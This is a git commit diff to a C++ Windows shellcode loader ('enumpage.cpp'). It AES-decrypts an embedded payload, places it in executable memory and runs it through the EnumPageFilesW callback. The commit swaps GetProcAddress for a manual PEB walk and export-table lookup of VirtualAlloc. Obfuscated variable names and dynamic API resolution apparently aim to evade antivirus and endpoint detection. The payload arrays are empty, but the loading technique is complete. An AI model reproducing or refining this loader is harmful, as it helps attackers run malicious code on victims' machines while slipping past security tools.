ca5bc70d182f08762aec7956ff7010b9b651cc12
dhanush <114467712+dagowda@users.noreply.github.com>
2025-03-29 16:22:55 -0400

    Update enumpage.cpp

--- dummyda/enumpage.cpp
+++ dummyda/enumpage.cpp
@@ -1,6 +1,5 @@
-
 #include <windows.h>
-#include <stdio.h>
+#include <iostream>
 #include <psapi.h>
 
 // alfarom256 calc shellcode
@@ -8,6 +7,8 @@ unsigned char ke185hams[] = {};
 unsigned char AESiv[] = {};
     
 unsigned char itsthecod345[] = {};
+
+    
     
 void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DWORD ivLen) {
     HCRYPTPROV hProv;
@@ -26,33 +27,110 @@ void aesdecrypt(char* data, DWORD dataLen, char* key, DWORD keyLen, char* iv, DW
     CryptReleaseContext(hProv, 0);
 }
 
-typedef HMODULE(WINAPI* tlloadlibraryA)(LPCSTR);
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
 
-HMODULE coolloadliba(LPCSTR lpLibFileName){
+typedef struct _LDR_DATA_TABLE_ENTRY {
+    LIST_ENTRY InLoadOrderLinks;
+    LIST_ENTRY InMemoryOrderLinks;
+    LIST_ENTRY InInitializationOrderLinks;
+    PVOID DllBase;
+    PVOID EntryPoint;
+    ULONG SizeOfImage;
+    UNICODE_STRING FullDllName;
+    UNICODE_STRING BaseDllName;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
-    HMODULE hModule = NULL;
-    HMODULE kern332= GetModuleHandleA("kernel32.dll");
-    if(kern332){
-       tlloadlibraryA ploadliba = (tlloadlibraryA)GetProcAddress(kern332,"LoadLibraryA");
-       if(ploadliba){
-          hModule = ploadliba(lpLibFileName);
-       }
-      }
-     return hModule;
-   }
+typedef struct _PEB_LDR_DATA {
+    ULONG Length;
+    BOOLEAN Initialized;
+    PVOID SsHandle;
+    LIST_ENTRY InLoadOrderModuleList;
+} PEB_LDR_DATA, *PPEB_LDR_DATA;
 
+typedef struct _PEB {
+    BOOLEAN InheritedAddressSpace;
+    BOOLEAN ReadImageFileExecOptions;
+    BOOLEAN BeingDebugged;
+    BOOLEAN SpareBool;
+    HANDLE Mutant;
+    PVOID ImageBaseAddress;
+    PPEB_LDR_DATA Ldr;
+} PEB, *PPEB;
 
+typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+
+fnVirtualAlloc GetVirtualAlloc() {
+#ifdef _M_X64
+    PPEB peb = (PPEB)__readgsqword(0x60); // Get PEB on x64
+#else
+    PPEB peb = (PPEB)__readfsdword(0x30); // Get PEB on x86
+#endif
+
+    PPEB_LDR_DATA ldr = peb->Ldr;
+    LIST_ENTRY* moduleList = &ldr->InLoadOrderModuleList;
+    LIST_ENTRY* entry = moduleList->Flink;
+
+    while (entry != moduleList) {
+        PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)entry;
+        entry = entry->Flink;  // Move to next module
+
+        if (!module->BaseDllName.Buffer) continue;
+
+        // Print module name for debugging
+        wprintf(L"Loaded Module: %s\n", module->BaseDllName.Buffer);
+
+        if (_wcsicmp(module->BaseDllName.Buffer, L"KERNEL32.DLL") == 0) {
+            BYTE* baseAddress = (BYTE*)module->DllBase;
+
+            IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
+            IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew);
+            IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+            if (exportDir.VirtualAddress == 0) return nullptr;  // No export table found
+
+            IMAGE_EXPORT_DIRECTORY* exportTable = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + exportDir.VirtualAddress);
+            DWORD* nameArray = (DWORD*)(baseAddress + exportTable->AddressOfNames);
+            WORD* ordinalArray = (WORD*)(baseAddress + exportTable->AddressOfNameOrdinals);
+            DWORD* funcArray = (DWORD*)(baseAddress + exportTable->AddressOfFunctions);
+
+            for (DWORD i = 0; i < exportTable->NumberOfNames; i++) {
+                char* functionName = (char*)(baseAddress + nameArray[i]);
+
+                // Print function name for debugging
+                std::cout << "Exported Function: " << functionName << std::endl;
+
+                if (strcmp(functionName, "VirtualAlloc") == 0) {
+                    DWORD funcRVA = funcArray[ordinalArray[i]];
+                    return (fnVirtualAlloc)(baseAddress + funcRVA);
+                }
+            }
+        }
+    }
+    return nullptr;
+}
 
 int main() {
+    fnVirtualAlloc VirtualAlloc_Dynamic = GetVirtualAlloc();
 
-    HMODULE ker32=coolloadliba("kernel32.dll");
-    
-    LPVOID (*pvirtualalloc)(LPVOID,SIZE_T,DWORD, DWORD)=(LPVOID(*)(LPVOID , SIZE_T,DWORD, DWORD))GetProcAddress(ker32, "VirtualAlloc");
-    
-    LPVOID addr = pvirtualalloc(NULL, sizeof(itsthecod345), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    aesdecrypt((char*)itsthecod345, sizeof(itsthecod345), (char*)ke185hams, sizeof(ke185hams), (char*)AESiv, sizeof(AESiv));
-        
-    RtlMoveMemory(addr, itsthecod345, sizeof(itsthecod345));
+    if (VirtualAlloc_Dynamic) {
+        std::cout << "VirtualAlloc found at: " << VirtualAlloc_Dynamic << std::endl;
 
-    ::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr, NULL);
+        LPVOID addr = VirtualAlloc_Dynamic(NULL, sizeof(itsthecod345), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        if (addr) {
+            std::cout << "Memory allocated successfully at: " << addr << std::endl;
+        } else {
+            std::cout << "Failed to allocate memory!" << std::endl;
+        }
+        aesdecrypt((char*)itsthecod345, sizeof(itsthecod345), (char*)ke185hams, sizeof(ke185hams), (char*)AESiv, sizeof(AESiv));
+        RtlMoveMemory(addr, itsthecod345, sizeof(itsthecod345));
+        ::EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)addr, NULL);
+    } else {
+        std::cout << "Failed to find VirtualAlloc!" << std::endl;
+    }
+    
+    
 }
